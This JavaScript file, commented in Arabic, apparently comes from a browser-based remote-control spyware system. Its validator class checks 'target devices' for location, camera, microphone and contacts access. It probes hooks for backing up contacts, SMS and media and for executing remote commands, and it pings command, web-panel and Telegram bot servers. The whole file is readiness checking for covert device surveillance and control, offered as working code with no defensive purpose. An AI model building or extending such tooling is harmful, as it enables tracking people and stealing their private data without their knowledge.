/**
 * نظام التحقق من صحة الأذونات والوظائف
 * Permissions and Functions Validation System
 */

class PermissionsValidator {
    constructor() {
        this.permissions = new Map();
        this.functions = new Map();
        this.devices = new Map();
        this.validationResults = new Map();
        this.isValidating = false;
    }

    // بدء عملية التحقق الشامل
    async startComprehensiveValidation() {
        try {
            console.log('🔍 بدء التحقق الشامل من صحة الأذونات والوظائف...');
            this.isValidating = true;

            // 1. التحقق من الأذونات الأساسية
            await this.validateBasicPermissions();

            // 2. التحقق من الأذونات المتقدمة
            await this.validateAdvancedPermissions();

            // 3. التحقق من الوظائف الأساسية
            await this.validateBasicFunctions();

            // 4. التحقق من الوظائف المتقدمة
            await this.validateAdvancedFunctions();

            // 5. التحقق من الأجهزة المستهدفة
            await this.validateTargetDevices();

            // 6. التحقق من آلية الاستيراد والتخزين
            await this.validateImportAndStorage();

            // 7. التحقق من الاتصال بالخوادم
            await this.validateServerConnections();

            // 8. إنشاء تقرير شامل
            const report = this.generateValidationReport();

            console.log('✅ تم إكمال التحقق الشامل');
            return report;

        } catch (error) {
            console.error('❌ خطأ في التحقق الشامل:', error);
            return this.generateErrorReport(error);
        } finally {
            this.isValidating = false;
        }
    }

    // التحقق من الأذونات الأساسية
    async validateBasicPermissions() {
        console.log('🔐 التحقق من الأذونات الأساسية...');

        const basicPermissions = [
            { name: 'geolocation', test: () => this.testGeolocationPermission() },
            { name: 'camera', test: () => this.testCameraPermission() },
            { name: 'microphone', test: () => this.testMicrophonePermission() },
            { name: 'notifications', test: () => this.testNotificationsPermission() },
            { name: 'storage', test: () => this.testStoragePermission() }
        ];

        for (const permission of basicPermissions) {
            try {
                const result = await permission.test();
                this.permissions.set(permission.name, result);
                console.log(`✅ ${permission.name}: ${result.status}`);
            } catch (error) {
                this.permissions.set(permission.name, { status: 'failed', error: error.message });
                console.error(`❌ ${permission.name}: ${error.message}`);
            }
        }
    }

    // التحقق من الأذونات المتقدمة
    async validateAdvancedPermissions() {
        console.log('🔐 التحقق من الأذونات المتقدمة...');

        const advancedPermissions = [
            { name: 'contacts', test: () => this.testContactsPermission() },
            { name: 'persistent-storage', test: () => this.testPersistentStoragePermission() },
            { name: 'background-sync', test: () => this.testBackgroundSyncPermission() },
            { name: 'device-info', test: () => this.testDeviceInfoPermission() },
            { name: 'system-settings', test: () => this.testSystemSettingsPermission() }
        ];

        for (const permission of advancedPermissions) {
            try {
                const result = await permission.test();
                this.permissions.set(permission.name, result);
                console.log(`✅ ${permission.name}: ${result.status}`);
            } catch (error) {
                this.permissions.set(permission.name, { status: 'failed', error: error.message });
                console.error(`❌ ${permission.name}: ${error.message}`);
            }
        }
    }

    // التحقق من الوظائف الأساسية
    async validateBasicFunctions() {
        console.log('⚙️ التحقق من الوظائف الأساسية...');

        const basicFunctions = [
            { name: 'getLocation', test: () => this.testGetLocationFunction() },
            { name: 'takePhoto', test: () => this.testTakePhotoFunction() },
            { name: 'recordAudio', test: () => this.testRecordAudioFunction() },
            { name: 'saveData', test: () => this.testSaveDataFunction() },
            { name: 'sendNotification', test: () => this.testSendNotificationFunction() }
        ];

        for (const func of basicFunctions) {
            try {
                const result = await func.test();
                this.functions.set(func.name, result);
                console.log(`✅ ${func.name}: ${result.status}`);
            } catch (error) {
                this.functions.set(func.name, { status: 'failed', error: error.message });
                console.error(`❌ ${func.name}: ${error.message}`);
            }
        }
    }

    // التحقق من الوظائف المتقدمة
    async validateAdvancedFunctions() {
        console.log('⚙️ التحقق من الوظائف المتقدمة...');

        const advancedFunctions = [
            { name: 'backupContacts', test: () => this.testBackupContactsFunction() },
            { name: 'backupSMS', test: () => this.testBackupSMSFunction() },
            { name: 'backupMedia', test: () => this.testBackupMediaFunction() },
            { name: 'getDeviceInfo', test: () => this.testGetDeviceInfoFunction() },
            { name: 'executeCommand', test: () => this.testExecuteCommandFunction() }
        ];

        for (const func of advancedFunctions) {
            try {
                const result = await func.test();
                this.functions.set(func.name, result);
                console.log(`✅ ${func.name}: ${result.status}`);
            } catch (error) {
                this.functions.set(func.name, { status: 'failed', error: error.message });
                console.error(`❌ ${func.name}: ${error.message}`);
            }
        }
    }

    // التحقق من الأجهزة المستهدفة
    async validateTargetDevices() {
        console.log('📱 التحقق من الأجهزة المستهدفة...');

        try {
            // التحقق من معرف الجهاز
            const deviceId = this.getDeviceId();
            this.devices.set('deviceId', { status: 'success', value: deviceId });

            // التحقق من معلومات الجهاز
            const deviceInfo = await this.getDeviceInfo();
            this.devices.set('deviceInfo', { status: 'success', value: deviceInfo });

            // التحقق من قدرات الجهاز
            const capabilities = await this.getDeviceCapabilities();
            this.devices.set('capabilities', { status: 'success', value: capabilities });

            // التحقق من حالة الاتصال
            const connectionStatus = await this.checkConnectionStatus();
            this.devices.set('connection', { status: 'success', value: connectionStatus });

            console.log('✅ تم التحقق من الأجهزة المستهدفة بنجاح');

        } catch (error) {
            this.devices.set('error', { status: 'failed', error: error.message });
            console.error('❌ خطأ في التحقق من الأجهزة المستهدفة:', error);
        }
    }

    // التحقق من آلية الاستيراد والتخزين
    async validateImportAndStorage() {
        console.log('💾 التحقق من آلية الاستيراد والتخزين...');

        try {
            // التحقق من التخزين المحلي
            const localStorageStatus = this.testLocalStorage();
            this.validationResults.set('localStorage', localStorageStatus);

            // التحقق من التخزين المؤقت
            const sessionStorageStatus = this.testSessionStorage();
            this.validationResults.set('sessionStorage', sessionStorageStatus);

            // التحقق من IndexedDB
            const indexedDBStatus = await this.testIndexedDB();
            this.validationResults.set('indexedDB', indexedDBStatus);

            // التحقق من Cookies
            const cookiesStatus = this.testCookies();
            this.validationResults.set('cookies', cookiesStatus);

            // التحقق من آلية الاستيراد
            const importStatus = await this.testImportMechanism();
            this.validationResults.set('import', importStatus);

            console.log('✅ تم التحقق من آلية الاستيراد والتخزين بنجاح');

        } catch (error) {
            this.validationResults.set('storage_error', { status: 'failed', error: error.message });
            console.error('❌ خطأ في التحقق من آلية الاستيراد والتخزين:', error);
        }
    }

    // التحقق من الاتصال بالخوادم
    async validateServerConnections() {
        console.log('🌐 التحقق من الاتصال بالخوادم...');

        try {
            // التحقق من خادم الأوامر
            const commandServerStatus = await this.testCommandServerConnection();
            this.validationResults.set('commandServer', commandServerStatus);

            // التحقق من خادم الواجهة
            const webInterfaceStatus = await this.testWebInterfaceConnection();
            this.validationResults.set('webInterface', webInterfaceStatus);

            // التحقق من خادم البوت
            const botServerStatus = await this.testBotServerConnection();
            this.validationResults.set('botServer', botServerStatus);

            console.log('✅ تم التحقق من الاتصال بالخوادم بنجاح');

        } catch (error) {
            this.validationResults.set('server_error', { status: 'failed', error: error.message });
            console.error('❌ خطأ في التحقق من الاتصال بالخوادم:', error);
        }
    }

    // اختبارات الأذونات الأساسية
    async testGeolocationPermission() {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 60000
                });
            });

            return {
                status: 'granted',
                data: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }
            };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testCameraPermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(track => track.stop());
            return { status: 'granted' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testMicrophonePermission() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            stream.getTracks().forEach(track => track.stop());
            return { status: 'granted' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testNotificationsPermission() {
        try {
            if ('Notification' in window) {
                const permission = await Notification.requestPermission();
                return { status: permission };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testStoragePermission() {
        try {
            if ('storage' in navigator && 'persist' in navigator.storage) {
                const persisted = await navigator.storage.persist();
                return { status: persisted ? 'granted' : 'denied' };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    // اختبارات الأذونات المتقدمة
    async testContactsPermission() {
        try {
            if ('contacts' in navigator && 'select' in navigator.contacts) {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                return { status: 'granted', count: contacts.length };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testPersistentStoragePermission() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                return { status: 'granted', data: estimate };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testBackgroundSyncPermission() {
        try {
            if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
                return { status: 'supported' };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testDeviceInfoPermission() {
        try {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine
            };
            return { status: 'granted', data: deviceInfo };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    async testSystemSettingsPermission() {
        try {
            // محاولة الوصول لإعدادات النظام
            const settings = {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight
                }
            };
            return { status: 'granted', data: settings };
        } catch (error) {
            return { status: 'denied', error: error.message };
        }
    }

    // اختبارات الوظائف الأساسية
    async testGetLocationFunction() {
        try {
            if (window.realDataAccess) {
                const location = await window.realDataAccess.getCurrentLocation();
                return { status: 'success', data: location };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testTakePhotoFunction() {
        try {
            if (window.realDataAccess) {
                const photo = await window.realDataAccess.takePhoto();
                return { status: 'success', data: photo };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testRecordAudioFunction() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            stream.getTracks().forEach(track => track.stop());
            return { status: 'success' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testSaveDataFunction() {
        try {
            const testData = { test: 'data', timestamp: Date.now() };
            localStorage.setItem('test_data', JSON.stringify(testData));
            const retrieved = JSON.parse(localStorage.getItem('test_data'));
            localStorage.removeItem('test_data');
            
            if (retrieved.test === testData.test) {
                return { status: 'success' };
            }
            return { status: 'failed', error: 'Data mismatch' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testSendNotificationFunction() {
        try {
            if ('Notification' in window && Notification.permission === 'granted') {
                const notification = new Notification('Test', { body: 'Test notification' });
                setTimeout(() => notification.close(), 1000);
                return { status: 'success' };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    // اختبارات الوظائف المتقدمة
    async testBackupContactsFunction() {
        try {
            if (window.realDataAccess) {
                const result = await window.realDataAccess.backupContacts();
                return { status: 'success', data: result };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testBackupSMSFunction() {
        try {
            if (window.realDataAccess) {
                const result = await window.realDataAccess.backupSMS();
                return { status: 'success', data: result };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testBackupMediaFunction() {
        try {
            if (window.realDataAccess) {
                const result = await window.realDataAccess.backupMedia();
                return { status: 'success', data: result };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testGetDeviceInfoFunction() {
        try {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight
                }
            };
            return { status: 'success', data: deviceInfo };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testExecuteCommandFunction() {
        try {
            // اختبار تنفيذ أمر بسيط
            const testCommand = { action: 'get_device_info' };
            if (window.executeCommand) {
                const result = await window.executeCommand(testCommand);
                return { status: 'success', data: result };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    // اختبارات التخزين
    testLocalStorage() {
        try {
            const testKey = 'test_local_storage';
            const testValue = { test: 'data', timestamp: Date.now() };
            
            localStorage.setItem(testKey, JSON.stringify(testValue));
            const retrieved = JSON.parse(localStorage.getItem(testKey));
            localStorage.removeItem(testKey);
            
            return { status: 'success', data: retrieved };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    testSessionStorage() {
        try {
            const testKey = 'test_session_storage';
            const testValue = { test: 'data', timestamp: Date.now() };
            
            sessionStorage.setItem(testKey, JSON.stringify(testValue));
            const retrieved = JSON.parse(sessionStorage.getItem(testKey));
            sessionStorage.removeItem(testKey);
            
            return { status: 'success', data: retrieved };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testIndexedDB() {
        try {
            if ('indexedDB' in window) {
                const db = await this.openTestIndexedDB();
                const transaction = db.transaction(['test'], 'readwrite');
                const store = transaction.objectStore('test');
                
                const testData = { id: 'test', data: 'test_value', timestamp: Date.now() };
                await store.put(testData);
                const retrieved = await store.get('test');
                
                db.close();
                return { status: 'success', data: retrieved };
            }
            return { status: 'not_supported' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    testCookies() {
        try {
            const testCookie = 'test_cookie=test_value; max-age=60; path=/';
            document.cookie = testCookie;
            
            const cookies = document.cookie.split(';');
            const testCookieFound = cookies.some(cookie => cookie.trim().startsWith('test_cookie='));
            
            // حذف الكوكي
            document.cookie = 'test_cookie=; max-age=0; path=/';
            
            return { status: testCookieFound ? 'success' : 'failed' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testImportMechanism() {
        try {
            // اختبار آلية استيراد الأجهزة
            const importData = {
                deviceId: this.getDeviceId(),
                timestamp: Date.now(),
                status: 'active'
            };
            
            // محاولة استيراد البيانات
            if (window.importDeviceData) {
                const result = await window.importDeviceData(importData);
                return { status: 'success', data: result };
            }
            return { status: 'not_available' };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    // اختبارات الاتصال بالخوادم
    async testCommandServerConnection() {
        try {
            const response = await fetch('https://remote-control-command-server.onrender.com/health', {
                method: 'GET',
                timeout: 5000
            });
            return { status: response.ok ? 'success' : 'failed', code: response.status };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testWebInterfaceConnection() {
        try {
            const response = await fetch('https://remote-control-web.onrender.com/api/devices', {
                method: 'GET',
                timeout: 5000
            });
            return { status: response.ok ? 'success' : 'failed', code: response.status };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    async testBotServerConnection() {
        try {
            const response = await fetch('https://remote-control-telegram-bot.onrender.com/health', {
                method: 'GET',
                timeout: 5000
            });
            return { status: response.ok ? 'success' : 'failed', code: response.status };
        } catch (error) {
            return { status: 'failed', error: error.message };
        }
    }

    // وظائف مساعدة
    getDeviceId() {
        return localStorage.getItem('deviceId') || `DEV-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    }

    async getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine
        };
    }

    async getDeviceCapabilities() {
        return {
            geolocation: 'geolocation' in navigator,
            camera: 'mediaDevices' in navigator,
            microphone: 'mediaDevices' in navigator,
            notifications: 'Notification' in window,
            storage: 'localStorage' in window,
            indexedDB: 'indexedDB' in window
        };
    }

    async checkConnectionStatus() {
        return {
            online: navigator.onLine,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null
        };
    }

    async openTestIndexedDB() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open('TestDB', 1);
            
            request.onerror = () => reject(request.error);
            request.onsuccess = () => resolve(request.result);
            
            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                if (!db.objectStoreNames.contains('test')) {
                    db.createObjectStore('test', { keyPath: 'id' });
                }
            };
        });
    }

    // إنشاء تقرير التحقق
    generateValidationReport() {
        const report = {
            timestamp: new Date().toISOString(),
            summary: {
                totalPermissions: this.permissions.size,
                totalFunctions: this.functions.size,
                totalDevices: this.devices.size,
                totalValidations: this.validationResults.size
            },
            permissions: Object.fromEntries(this.permissions),
            functions: Object.fromEntries(this.functions),
            devices: Object.fromEntries(this.devices),
            validations: Object.fromEntries(this.validationResults),
            recommendations: this.generateRecommendations()
        };

        console.log('📊 تقرير التحقق:', report);
        return report;
    }

    generateErrorReport(error) {
        return {
            timestamp: new Date().toISOString(),
            error: error.message,
            stack: error.stack,
            status: 'failed'
        };
    }

    generateRecommendations() {
        const recommendations = [];

        // تحليل الأذونات
        for (const [permission, result] of this.permissions) {
            if (result.status === 'denied' || result.status === 'failed') {
                recommendations.push(`إعادة طلب صلاحية ${permission}`);
            }
        }

        // تحليل الوظائف
        for (const [func, result] of this.functions) {
            if (result.status === 'failed') {
                recommendations.push(`إصلاح وظيفة ${func}`);
            }
        }

        // تحليل الأجهزة
        for (const [device, result] of this.devices) {
            if (result.status === 'failed') {
                recommendations.push(`إصلاح مشكلة الجهاز: ${device}`);
            }
        }

        return recommendations;
    }
}

// تصدير النظام
window.PermissionsValidator = PermissionsValidator;